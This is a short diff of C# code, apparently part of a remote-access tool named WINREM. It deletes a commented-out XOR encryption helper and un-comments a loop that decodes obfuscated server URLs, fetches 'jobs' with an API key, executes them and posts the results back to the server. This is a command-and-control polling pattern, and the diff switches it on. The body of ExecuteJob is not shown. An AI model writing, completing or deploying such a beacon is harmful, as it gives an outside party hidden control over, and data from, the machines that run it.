@@ -23,39 +23,18 @@ namespace WINREM
             }
             return Encoding.UTF8.GetString(url);
         }
-
-        //public byte[] encrypt(string data, byte[] key)
-        //{
-        //    byte[] dataBytes = Encoding.UTF8.GetBytes(data);
-        //    for(int i = 0; i < dataBytes.Length - 1; i++)
-        //    {
-        //        dataBytes[i] = (byte)(dataBytes[i] ^ key[i]);
-        //    }
-        //    return dataBytes;
-        //}
-
-        //public void PrintByteArray(byte[] bytes)
-        //{
-        //    var sb = new StringBuilder("new byte[] { ");
-        //    foreach (var b in bytes)
-        //    {
-        //        sb.Append(b + ", ");
-        //    }
-        //    sb.Append("}");
-        //    Console.WriteLine(sb.ToString());
-        //}
         public async Task CheckForJob(string apiKey, byte[] key)
         {
             string getUrl = xOrUrl(checkEndpoint, key);
             string PostUrl = xOrUrl(postEndpoint, key);
 
-            //List<JobDTO> jobs = GetJobs(getUrl, apiKey).Result;
-            //foreach (JobDTO job in jobs)
-            //{
-            //    string result = await ExecuteJob(job);
-            //    PostDTO PostData = new PostDTO { apiKey = apiKey, output = result };
-            //    await SendJobResult(PostUrl, PostData);
-            //}
+            List<JobDTO> jobs = GetJobs(getUrl, apiKey).Result;
+            foreach (JobDTO job in jobs)
+            {
+                string result = await ExecuteJob(job);
+                PostDTO PostData = new PostDTO { apiKey = apiKey, output = result };
+                await SendJobResult(PostUrl, PostData);
+            }
         }
 
         private async Task<string> ExecuteJob(JobDTO job)
